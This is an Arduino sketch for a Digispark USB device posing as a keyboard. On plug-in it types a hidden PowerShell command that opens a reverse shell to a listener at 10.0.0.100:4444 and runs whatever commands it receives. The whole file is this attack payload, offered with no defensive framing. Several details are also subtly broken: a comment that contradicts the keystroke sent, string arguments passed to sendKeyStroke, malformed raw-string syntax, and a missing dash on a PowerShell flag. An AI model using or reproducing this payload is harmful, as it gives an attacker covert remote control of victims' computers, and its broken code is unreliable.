

  #include "DigiKeyboard.h"

  String IPPORT = F("'10.0.0.100',4444");

  String POWERSHELL_COMMAND;

  void setup() {

    POWERSHELL_COMMAND = R"$c=New-Object System.Net.Sockets.TCPClient('" + IPPORT + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()";

    DigiKeyboard.delay(1000);

    DigiKeyboard.sendKeyStroke(0);
    // Press Windows Key + R to open the Run dialog
    DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_S);

    DigiKeyboard.delay(600);

    DigiKeyboard.sendKeyStroke("powershell.exe WindowStyle Hidden -Command " + POWERSHELL_COMMAND);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);


  }

  void loop() {}


